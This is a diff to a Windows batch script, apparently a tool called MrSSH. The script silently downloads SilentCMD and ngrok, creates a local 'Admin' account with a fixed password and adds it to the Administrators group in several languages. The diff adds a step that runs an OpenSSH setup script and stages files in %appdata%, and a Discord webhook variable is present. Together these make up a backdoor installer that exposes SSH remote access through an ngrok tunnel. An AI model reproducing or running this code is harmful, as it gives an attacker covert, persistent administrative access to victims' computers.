@@ -5,10 +5,16 @@ curl -Ls "https://raw.githubusercontent.com/agamsol/Batch-Projects/main/Discord-
 curl -Ls "https://github.com/dh3b/MrSSH/blob/main/Files/SilentCMD.exe?raw=true" -o "SilentCMD.exe"
 curl -Ls "https://bin.equinox.io/c/4VmDzA7iaHb/ngrok-stable-windows-amd64.zip" -o "ngrok.zip"
 
+powershell ./OpenSSH.ps1
+
 net user "Admin" "Administrator" /add
 net localgroup Administrators Admin /add
 net localgroup Administratorzy Admin /add
 net localgroup Administración  Admin /add
+
+mkdir %appdata%\MrSSH
+cd %appdata%\MrSSH &
+
 
 set "webhook="
 
